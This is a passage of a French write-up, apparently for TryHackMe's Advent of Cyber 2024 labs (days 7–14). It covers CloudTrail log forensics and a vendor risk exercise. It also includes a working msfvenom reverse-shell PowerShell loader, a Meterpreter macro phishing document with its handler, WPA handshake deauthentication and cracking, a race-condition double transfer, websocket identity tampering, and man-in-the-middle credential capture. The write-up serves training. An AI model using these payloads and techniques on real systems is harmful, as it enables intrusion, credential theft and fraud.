2024-11-28T15:22:44Z  AwsApiCall        ListObjects                          s3.amazonaws.com                     glitch     [...expurgé...]  [S3Console/0.4, aws-internal/3 aws-sdk-java/1.12.750 Linux/5.10.226-193.880.amzn2int.x86_64 OpenJDK_64-Bit_Server_VM/25.412-b09 java/1.8.0_412 vendor/Oracle_Corporation cfg/retry-mode/standard]
[...expurgé...]       AwsConsoleSignIn  ConsoleLogin                         [...expurgé...]                      glitch     [...expurgé...]  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
2024-11-28T15:21:57Z  AwsApiCall        GetCostAndUsage                      ce.amazonaws.com                     glitch     [...expurgé...]  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
2024-11-28T15:21:57Z  AwsApiCall        ListEnrollmentStatuses               cost-optimization-hub.amazonaws.com  glitch     [...expurgé...]  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
2024-11-28T15:21:57Z  AwsApiCall        DescribeEventAggregates              health.amazonaws.com                 glitch     [...expurgé...]  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
2024-11-28T15:22:12Z  AwsApiCall        ListBuckets                          s3.amazonaws.com                     glitch     [...expurgé...]  [S3Console/0.4, aws-internal/3 aws-sdk-java/1.12.750 Linux/5.10.226-193.880.amzn2int.x86_64 OpenJDK_64-Bit_Server_VM/25.412-b09 java/1.8.0_412 vendor/Oracle_Corporation cfg/retry-mode/standard]
2024-11-28T15:22:14Z  AwsApiCall        GetStorageLensConfiguration          s3.amazonaws.com                     glitch     AWS Internal     AWS Internal
2024-11-28T15:22:14Z  AwsApiCall        GetStorageLensDashboardDataInternal  s3.amazonaws.com                     glitch     AWS Internal     AWS Internal
2024-11-28T15:22:13Z  AwsApiCall        GetStorageLensDashboardDataInternal  s3.amazonaws.com                     glitch     AWS Internal     AWS Internal
2024-11-28T15:21:57Z  AwsApiCall        DescribeEventAggregates              health.amazonaws.com                 glitch     [...expurgé...]  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
2024-11-28T15:21:57Z  AwsApiCall        GetCostAndUsage                      ce.amazonaws.com                     glitch     [...expurgé...]  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
{% endcapture %}
{% include elements/spoil.html %}

Explications de la commande :

|Commande|Utilité|
|:--:|:--:|
|`["Event_Time", "Event_type", "Event_Name", "Event_Source", "User_Name", "Source_IP", "User_Agent"]`| Défini les entêtes qui seront affichées|
|`.Records[] | select(.userIdentity.userName == "glitch")`| Récupérer les entrées pour l'utilisateur `glitch`|
|`[.eventTime, .eventType, .eventName, .eventSource, .userIdentity.userName //"N/A", .sourceIPAddress //"N/A", .userAgent //"N/A"]`|Sélectionner les informations souhaitées (remplacer par "N/A" si vide)|
|`@tsv`|Convertir en tableau dont les colonnes sont séparées par des tabulations|
|`column -t -s $'\t'`| Afficher sous la forme de colonnes délimitées par des tabulations|

Afin de déterminer le nom de l'utilisateur créé par `mcskidy`, nous utiliserons la commande suivante afin de cibler le service `iam.amazonaws.com` qui sert à la gestion des comptes :

```bash
# Je me suis d'abord aidé de la commande ci-dessous pour savoir quel paramètre afficher
cat cloudtrail_log.json | jq | grep -C5 requestParameters | grep -v null

jq -r '["Event_Time", "Event_type", "Event_Name", "Event_Source", "User_Name", "Source_IP", "Created_username"],(.Records[] | select(.userIdentity.userName == "mcskidy") | select(.eventName == "CreateUser") | [.eventTime, .eventType, .eventName, .eventSource, .userIdentity.userName //"N/A", .sourceIPAddress //"N/A", .requestParameters.userName //"N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'
```

{% capture spoil %}
Event_Time            Event_type  Event_Name  Event_Source       User_Name  Source_IP     Created_username
2024-11-28T15:21:35Z  AwsApiCall  CreateUser  iam.amazonaws.com  mcskidy    53.94.201.69  glitch
{% endcapture %}
{% include elements/spoil.html %}

Le compte `glitch` a été créé par `mcskidy` peu de temps avant les manipulations suspectes.

En analysant ce nouveau compte, nous constatons qu'il dispose de droits élevés sur AWS :

```bash
jq -r '["Event_Time", "Event_type", "Event_Name", "Event_Source", "User_Name", "Source_IP", "Privileges"],(.Records[] | select(.eventSource == "iam.amazonaws.com") | select(.eventName == "AttachUserPolicy") | [.eventTime, .eventType, .eventName, .eventSource, .userIdentity.userName //"N/A", .sourceIPAddress //"N/A", .requestParameters.policyArn //"N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'
```

{% capture spoil %}
Event_Time            Event_type  Event_Name        Event_Source       User_Name  Source_IP     Privileges
2024-11-28T15:21:36Z  AwsApiCall  AttachUserPolicy  iam.amazonaws.com  mcskidy    53.94.201.69  arn:aws:iam::aws:policy/[...expurgé...]
{% endcapture %}
{% include elements/spoil.html %}

Mais il semblerait que quelque chose ne soit pas normal : l'adresse IP utilisé par `mcskidy` en temps normal ne correspond pas à celle utilisée lors de la création de l'utilisateur `glitch`. C'est l'adresse IP de `mayor_malware` !

```bash
jq -r '["Event_Time", "Event_type", "Event_Name", "Event_Source", "User_Name", "Source_IP"],(.Records[] | select(.eventName == "ConsoleLogin") | [.eventTime,.eventType, .eventName, .eventSource, .userIdentity.userName //"N/A", .sourceIPAddress //"N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'
```

{% capture spoil %}
Event_Time            Event_type        Event_Name    Event_Source          User_Name      Source_IP
2024-11-28T15:18:37Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
2024-11-28T15:20:54Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mcskidy        5[...expurgé...]9
[...expurgé...]       AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  glitch         5[...expurgé...]9
2024-11-22T12:20:54Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mcskidy        3[...expurgé...]9
2024-11-23T07:15:54Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mcskidy        3[...expurgé...]9
2024-11-24T05:19:31Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mcskidy        3[...expurgé...]9
2024-11-25T01:11:32Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mcskidy        3[...expurgé...]9
2024-11-26T19:22:05Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mcskidy        3[...expurgé...]9
2024-11-22T11:08:03Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
2024-11-23T07:19:01Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
2024-11-24T02:28:17Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
2024-11-25T21:48:22Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
2024-11-26T22:55:51Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
{% endcapture %}
{% include elements/spoil.html %}

Enfin, pour obtenir le numéro de compte de Mayor Malware, nous utilisons une {% include dictionary.html word="regex" %} permettant de trouver les informations au bon format (4 ensembles de 4 chiffres, ensembles séparés par des espaces) :

```bash
grep -E '([0-9]{4}\s){3}[0-9]{4}' rds.log | grep -i 'mayor'
```

{% capture spoil %}
2024-11-28T15:23:02.605Z 2024-11-28T15:23:02.605700Z      263 Query	INSERT INTO wareville_bank_transactions (account_number, account_owner, amount) VALUES ('[...expurgé...]', 'Mayor Malware', 193.45)
2024-11-28T15:23:02.792Z 2024-11-28T15:23:02.792161Z      263 Query	INSERT INTO wareville_bank_transactions (account_number, account_owner, amount) VALUES ('[...expurgé...]', 'Mayor Malware', 998.13)
2024-11-28T15:23:02.976Z 2024-11-28T15:23:02.976943Z      263 Query	INSERT INTO wareville_bank_transactions (account_number, account_owner, amount) VALUES ('[...expurgé...]', 'Mayor Malware', 865.75)
2024-11-28T15:23:03.161Z 2024-11-28T15:23:03.161700Z      263 Query	INSERT INTO wareville_bank_transactions (account_number, account_owner, amount) VALUES ('[...expurgé...]', 'Mayor Malware', 409.54)
[...expurgé pour brièveté...]
{% endcapture %}
{% include elements/spoil.html %}

## Jour 8 : Shellcodes du monde, rassemblement

![Shellcodes](https://img.shields.io/badge/Shellcodes-453368?logo=tryhackme)

![Jour 8](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1730451713924.svg)

Le but de l'exercice est de créer une charge permettant d'obtenir un {% include dictionary.html word="reverse-shell" %} sur une machine Windows.

Nous aurons besoin de créer la charge en elle-même depuis notre machine d'attaque avec la commande :

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.182.77 LPORT=4444 -f powershell
```

Puis nous ouvrons le port 4444 en attente de connexion avec {% include dictionary.html word="Netcat" %} sur la machine d'attaque :

```bash
rlwrap nc -lvnp 4444
```

Ensuite, sur la machine cible, nous lançons un terminal PowerShell et nous commençons par copier le bloc

```powershell
$VrtAlloc = @"
using System;
using System.Runtime.InteropServices;

public class VrtAlloc{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
}
"@

Add-Type $VrtAlloc 

$WaitFor= @"
using System;
using System.Runtime.InteropServices;

public class WaitFor{
 [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
}
"@

Add-Type $WaitFor

$CrtThread= @"
using System;
using System.Runtime.InteropServices;

public class CrtThread{
 [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
  
}
"@
Add-Type $CrtThread
```

Après avoir valider ce premier bloc, nous ajoutons le résultat de la commande `msfvenom` réalisée plus tôt.

Ensuite nous devons ajouter les commandes suivantes **ligne par ligne**

```powershell
[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
[WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

Nous avons obtenu notre {% include dictionary.html word="reverse-shell" %}

```bash
rlwrap nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.230.38 49808
Microsoft Windows [Version 10.0.17763.6293]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\glitch>whoami
whoami
aoc\glitch
```

Nous passons le shell de base (`cmd`) en PowerShell, puis nous navigons vers le flag et nous l'ouvrons :

```powershell
Get-ChildItem

    Directory: C:\Users\glitch


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        10/3/2024  10:56 PM                3D Objects                                                            
d-r---        10/3/2024  10:56 PM                Contacts                                                              
d-r---       12/14/2024   8:54 PM                Desktop                                                               
d-r---        10/3/2024  10:56 PM                Documents                                                             
d-r---        10/3/2024  10:56 PM                Downloads                                                             
d-r---        10/3/2024  10:56 PM                Favorites                                                             
d-r---        10/3/2024  10:56 PM                Links                                                                 
d-r---        10/3/2024  10:56 PM                Music                                                                 
d-r---        10/3/2024  10:56 PM                Pictures                                                              
d-r---        10/3/2024  10:56 PM                Saved Games                                                           
d-r---        10/3/2024  10:56 PM                Searches                                                              
d-r---        10/3/2024  10:56 PM                Videos                                                                


Set-Location .\Desktop
Get-ChildItem

    Directory: C:\Users\glitch\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website                                                  
-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website                                   
-a----        10/3/2024   2:22 PM             26 flag.txt                                                              


Get-Content flag.txt
AOC{[...expurge...]}
```

## Jour 9 : 9 heure, rend le GRC amusant, ne le dis à personne

![GRC](https://img.shields.io/badge/GRC-314267?logo=tryhackme)

![Jour 9](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1731940347460.png)

Le défi du jour nous demande d'évaluer 3 fournisseurs dans le cadre d'une activité GRC (*Governance, Risk and Compliance*).

**Fournisseur 1**

Nous devons chiffrer toutes nos données via un algorithme AES, néanmoins le fournisseur nous indique qu'il ne chiffre ni les données en transit, ni les données stockée. Cela représente un risque de vol de données **élevé** et **très certain** d'arriver.

Le fournisseur met en place un système *need-to-know* pour accéder aux données. C'est-à-dire que les personnes n'ont accès qu'aux données qui leur sont utiles. Bien que la méthode soit sécurisée, cela implique néanmoins la possibilité **critique** mais **rare** qu'un utilisateur empêche l'accès à ses données en cas de besoin de contrôle.

Lorsque le contrat est arrivé à son terme, le fournisseur conserve les données "plus d'un mois". L'absence de durée claire peut laisser craindre des fuites de données qui ne seraient plus correctement protégées, ce qui serait **critique** et **très probable**.

**Fournisseur 2**

De la même façon que le **fournisseur 1**, ce nouveau fournisseur ne chiffre pas les données, ce qui représente un risque de vol de données **élevé** et **très probable**.

Les données ne sont accessibles que par les équipes dédiées, et les administrateurs. Un risque de vol de compte ou d'abus de pouvoir pourrait se présenter, ce qui est **critique** et **certain**

Les données sont conservées entre 2 semaines et 1 mois après la fin du contrat. Durant cette période, des données pourraient être volées, ce qui aurait un impact **critique** et un risque **certain**.

**Fournisseur 3**

Le dernier fournisseur nous propose un chiffrement AES-256 sur les transits et le stockage. Cela peut engendrer une surconsommation des ressources ou une éventuelle perte de clé. Bien que l'impact serait **élevé**, ce risque reste **rare**

Seule l'équipe dédiée a accès aux ressources. Il reste un risque résiduel de compromission de compte dans l'équipe, il s'agit d'un risque **critique** de l'ordre du **possible**.

Comme le premier fournisseur, celui-ci conserve les données plus d'un mois. Le risque **critique** de vol de données devient **très probable**.

**Conclusion**

Entre les 3 fournisseurs, seul le dernier propose le chiffrement des données, et réduit ainsi son score de risque devenant ainsi le meilleur candidat

## Jour 10 : Il a un cerveau rempli de macro, et il a des shells dans son âme

![Phishing](https://img.shields.io/badge/Phishing-4d354a?logo=tryhackme)

![Jour 10](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1731376026704.svg)

Le dixième défi du Calendrier de l'Avent 2024 nous apprend la création d'un fichier `.docm` (document Word avec macro) dans une simulation de phishing.

La *payload* comportera un `meterpreter` pour Windows et sera créé via le *framework* `msfconsole`.

```txt
msf6 > setg payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp

use exploit/multi/fileformat/office_word_macro
[*] Using configured payload windows/meterpreter/reverse_tcp

msf6 exploit(multi/fileformat/office_word_macro) > setg lhost 10.10.189.230
lhost => 10.10.189.230

msf6 exploit(multi/fileformat/office_word_macro) > setg lport 9000
lport => 9000

set filename you_w0n.docm
filename => you_w0n.docm

msf6 exploit(multi/fileformat/office_word_macro) > show options
```

{% capture spoil %}
Module options (exploit/multi/fileformat/office_word_macro):

   Name            Current Setting                     Required  Description
   ----            ---------------                     --------  -----------
   CUSTOMTEMPLATE  /opt/metasploit-framework/embedded  yes       A docx file that will be used as a template to build the exp
                   /framework/data/exploits/office_wo            loit
                   rd_macro/template.docx
   FILENAME        you_w0n.docm                        yes       The Office document macro file (docm)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     ens5             yes       The listen address (an interface may be specified)
   LPORT     9000             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Office Word on Windows

msf6 exploit(multi/fileformat/office_word_macro) > run

[*] Using template: /opt/metasploit-framework/embedded/framework/data/exploits/office_word_macro/template.docx
[*] Injecting payload in document comments
[*] Injecting macro and other required files in document
[*] Finalizing docm: you_w0n.docm
[+] you_w0n.docm stored at /root/.msf4/local/you_w0n.docm
{% endcapture %}
{% include elements/spoil.html %}

> l'option `setg` (*set global*) permet de saisir les paramètres qui seront conservés, ce qui nous fera gagner du temps lors de la mise en place du *handler* à l'étape suivante.

```txt
msf6 exploit(multi/fileformat/office_word_macro) > use multi/handler
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > show options

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.189.230    yes       The listen address (an interface may be specified)
   LPORT     9000             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.189.230:9000
```

> Le *handler* est prérempli grâce à l'utilisation de `setg` à l'étape précédente

Nous allons maintenant envoyer le fichier malicieux à notre victime, et attendre qu'il soit utilisé.

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-10_mail.png" caption="Un mail de phishing plus vrai que nature... Ou presque" %}

Après quelques minutes, nous obtenons finalement une communication entrante :

```txt
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.189.230:9000 
[*] Sending stage (177734 bytes) to 10.10.131.147
[*] Meterpreter session 1 opened (10.10.189.230:9000 -> 10.10.131.147:49957) at 2024-12-16 21:29:57 +0000

meterpreter > 
```

Nous pouvons ouvrir le document qui nous intéresse via le `meterpreter` en place :

```txt
ls C:/Users/Administrator/Desktop
Listing: C:/Users/Administrator/Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  527   fil   2016-06-21 16:36:17 +0100  EC2 Feedback.website
100666/rw-rw-rw-  554   fil   2016-06-21 16:36:23 +0100  EC2 Microsoft Windows Guide.website
100666/rw-rw-rw-  282   fil   2021-03-17 15:13:27 +0000  desktop.ini
100666/rw-rw-rw-  23    fil   2024-11-12 03:42:45 +0000  flag.txt

meterpreter > cat C:/Users/Administrator/Desktop/flag.txt
THM{[...expurgé...]}
```

## Jour 11 : Si vous voulez vous connecter avec WPA, appuyez sur la touche étoile

![Wi-Fi attacks](https://img.shields.io/badge/Wi--Fi%20attacks-4d354a?logo=tryhackme)

![Jour 11](https://tryhackme-images.s3.amazonaws.com/user-uploads/618b3fa52f0acc0061fb0172/room-content/618b3fa52f0acc0061fb0172-1730305996223.png)

L'ensemble des commandes est à réaliser sur la machine distante.

Nous commençons par afficher les interfaces sans-fil de la machine.

```bash
iw dev
phy#2
	Interface wlan2
		ifindex 5
		wdev 0x200000001
		addr 02:[...expurgé...]:00
		type managed
		txpower 20.00 dBm
```

Nous utilisons ensuite le mode scanner pour afficher les réseaux Wi-Fi accessibles. Nous observons ainsi un réseau nommé `M[...expurgé...]P` :

```bash
sudo iw dev wlan2 scan
```

{% capture spoil %}
BSS 02:[...expurgé...]:00(on wlan2)
	last seen: 488.100s [boottime]
	TSF: 1734777765845574 usec (20078d, 10:42:45)
	freq: 2437
	beacon interval: 100 TUs
	capability: ESS Privacy ShortSlotTime (0x0411)
	signal: -30.00 dBm
	last seen: 0 ms ago
	Information elements from Probe Response frame:
	SSID: M[...expurgé...]P
	Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 
	DS Parameter set: channel 6
	ERP: Barker_Preamble_Mode
	Extended supported rates: 24.0 36.0 48.0 54.0 
	RSN:	 * Version: 1
		 * Group cipher: CCMP
		 * Pairwise ciphers: CCMP
		 * Authentication suites: PSK
		 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
	Supported operating classes:
		 * current operating class: 81
	Extended capabilities:
		 * Extended Channel Switching
		 * Operating Mode Notification
{% endcapture %}
{% include elements/spoil.html %}

Nous passons à présent l'interface en mode écoute (*monitor*) afin de permettre l'analyse du réseau, même sans y être connecté.

```bash
# Désactiver l'interface
sudo ip link set dev wlan2 down
# Passer wlan2 en mode monitor
sudo iw dev wlan2 set type monitor
# Réactiver l'interface
sudo ip link set dev wlan2 up
# Vérification
iw dev wlan2 info
Interface wlan2
	ifindex 5
	wdev 0x200000001
	addr 02:00:00:00:02:00
	type monitor
	wiphy 2
	channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
	txpower 20.00 dBm
```

Nous avons à présent besoin de deux instances {% include dictionary.html word="SSH" %} sur la machine distante afin de lancer notre attaque.

Avec la première instance, nous utilisons `airodump-ng` afin de capturer des paquets ***WPA handshake***

```bash
sudo airodump-ng -c 6 --bssid 02:[...expurgé...]:00 -w output-file wlan2
```

{% capture spoil %}
#Mode écoute
BSSID                  PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

02:[...expurgé...]:00  -28 100      631        8    0   6   54   WPA2 CCMP   PSK  MalwareM_AP  

#Reçu
BSSID                  STATION                PWR   Rate    Lost    Frames  Notes  Probes

02:[...expurgé...]:00  02:[...expurgé...]:00  -29    0 - 1      0        3 
{% endcapture %}
{% include elements/spoil.html %}

Nous pouvons constater qu'une machine est actuellement connectée au réseau que nous analysons.

Depuis la deuxième instance nous utilisons `aireplay-ng` pour forcer la déconnexion du client.

```bash
sudo aireplay-ng -0 1 -a 02:[...expurgé...]:00 -c 02:[...expurgé...]:00 wlan2
11:09:02  Waiting for beacon frame (BSSID: 02:00:00:00:00:00) on channel 6
11:09:02  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0| 0 ACKs]
```

De retour dans la première instance, nous observons une note `EAPOL` apparaître indiquant qu'un nouveau *handshake* a eu lieu. Nous l'avons capturé grâce à `airodump-ng` et sauvegardé dans les fichiers `output-file*`

Maintenant que nous avons intercepté le *handshake* nous pouvons tenter de craquer le mot de passe avec `aircrack-ng`.

```bash
sudo aircrack-ng -a 2 -b 02:[...expurgé...]:00 -w /home/glitch/rockyou.txt output*cap
```

{% capture spoil %}
Reading packets, please wait...
Opening output-file-04.cap
Read 273 packets.

1 potential targets

                               Aircrack-ng 1.6 

      [00:00:00] 512/513 keys tested (1161.16 k/s) 

      Time left: 0 seconds                                      99.81%

                        KEY FOUND! [ ...expurgé... ]


      Master Key     : 54 42 17 98 25 7C 66 3C 5D 2A A4 C8 0A AC 37 E6 
                       80 92 EC FE 5E EE C3 AC DB 1D 80 6C 6D 54 D3 5E 

      Transient Key  : 97 01 37 C7 CC 7B 9A C1 BA 1B 59 DA 45 90 59 74 
                       F2 A7 D2 64 EA 0E BA AA E2 28 41 D6 6D B6 05 B7 
                       37 02 F0 6A 80 1E 87 91 D8 10 26 5B 90 5D D4 D0 
                       6A AA 89 62 0A 6F A9 30 CB BD AA 76 12 4B 2B D0 

      EAPOL HMAC     : 2C 1F 19 3C B3 77 DD 9A F6 F5 0C D1 5F 3C D8 E8
{% endcapture %}
{% include elements/spoil.html %}

## Jour 12 : Si je ne peux pas voler leur argent, je volerais leur argent

![Web timing attacks](https://img.shields.io/badge/Web%20timing%20attacks-4d354a?logo=tryhackme)

![Jour 12](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1730353204089.png)

Nous commençons par ouvrir le site a attaqué, et nous arrivons sur une page de connexion.

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-12_login.png" caption="Page de connexion" %}

Puisqu'il s'agit d'un test en boîte grise, nous disposons d'identifiants.

Nous tentons un transfert de 500$ vers le compte suivant (111 puisque nous sommes 110)

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-12_transfert.png" caption="Transfert de 500$ vers le compte 111" %}

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-12_success.png" caption="Les 500$ ont bien été transférés" %}

Via BurpSuite, nous envoyons la requête correspondante vers le *Repeater* afin de vérifier si une protection contre les duplications d'opération existe.

```http
POST /transfer HTTP/1.1
Host: 10.10.79.254:5000
Content-Length: 29
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
Origin: http://10.10.79.254:5000
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.79.254:5000/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJuYW1lIjoiVGVzdGVyIiwidXNlciI6MTEwfQ.Z2anVg.ggtQGvUR37Zp7fQfFzVL_dec4NI
Connection: keep-alive

account_number=111&amount=500
```

Nous envoyons cette attaque en créant un groupe contenant cette même requête dix fois en parallèle.

Lorsque nous rafraîchissons notre tableau de bord, nous contatons que toutes les requêtes ont abouti, et que le solde du compte de test est maintenant **-4500$**

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-12_tester_balance.png" caption="Les transferts ont tous abouti avec BurpSuite" %}

Nous répétons ces manipulations depuis le compte 101 de Glitch afin de récupérer le flag.

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-12_flag.png" caption="Transfert de plus de 2000$ grâce aux transferts en parallèle pour obtenir le flag" %}

## Jour 13 : C'est arrivé sans mémoire tampon ! C'est arrivé sans lag

![Websockets](https://img.shields.io/badge/Websockets-4d354a?logo=tryhackme)

![Jour 13](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5fc2847e1bbebc03aa89fbf2-1731326932593.png)

Nous ouvrons BurpSuite et son navigateur pour capturer le trafic des websockets.

Lorsque nous cliquons sur suivre la voiture de Glitch (*Track*), nous interceptons une communication vers le serveur indiquant `42["track",{"userId":"5"}]`. Nous remplaçons la valeur `userId` par 8, et nous cliquons sur *forward* pour envoyer la requête modifiée ainsi que les suivantes jusqu'à obtention de la confirmation que nous suivons la voiture de Mayor Malware.

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-13_tracking.png" caption="Premier flag fourni par Mayor Malware" %}

A présent, nous allons tester la modification du `userId` lors de l'envoi d'un message.

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-13_test.png" caption="Message que nous enverrons pour tester la manipulation" %}

Nous réactivons l'interception du trafic, puis nous envoyons le message ci-dessus. Nous obtenons la communication vers le serveur `42["send_msg",{"txt":"My test message","sender":"5"}]` et nous modifions le numéro de `sender` par la valeur 8 correspondante à Mayor Malware.

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-13_message.png" caption="Le message a bien été envoyé en tant que Mayor Malware et non Glitch" %}

## Jour 14 : Même si nous sommes horriblement mal gérés, il n'y aura pas de visage triste durant SOC-mas

![Certificate mismanagement](https://img.shields.io/badge/Certificate%20mismanagement-4d354a?logo=tryhackme)

![Jour 14](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1731812568781.svg)

Lorsque nous ouvrons le site, nous avons un avertissement nous indiquant que le certificat est autosigné. Bien que ce soit fréquent sur des sites intranet d'entreprise, cette pratique peut représenter un danger si le site est exposé au public, ce qui est le cas ici

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-14_selfsigned.png" caption="Le certificat est autosigné et n'est pas reconnu par le navigateur" %}

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-14_crt_ca.png" caption="Le certificat est signé par la même organisation que le détenteur du site" %}

Nous allons nous insérer dans le trafic en nous faisant passer pour la passerelle de Wareville afin d'intercepter les informations de connexion des utilisateurs.

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-14_middle.png" caption="On s'insère au milieu du trafic de Wareville" %}

> Le certificat en place étant auto-signé, les utilisateurs sont habitués à "accepter le risque" en se connectant à ce site. Il n'y aura pas de changement dans leur habitude en utilisant le certificat auto-signé de BurpSuite

*Nous lançons ensuite le script de simulation de trafic internet.*

Nous interceptons les identifiants de l'elfe Snowball lors de sa connexion :

```http
POST /login.php HTTP/1.1
Host: gift-scheduler.thm
User-Agent: curl/7.68.0
Accept: */*
Content-Length: 40
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

username=snowballelf&password=[...expurgé...]
```

En nous connectant avec ces identifiants, nous pouvons récupérer le premier flag :

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-14_elf_flag.png" caption="Connexion avec les identifiants d'un elfe" %}

Nous observons également les identifiants de Marta Mayware :

```http
POST /login.php HTTP/1.1
Host: gift-scheduler.thm
User-Agent: curl/7.68.0
Accept: */*
Content-Length: 49
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

username=marta_mayware&password=[...expurgé...]
```

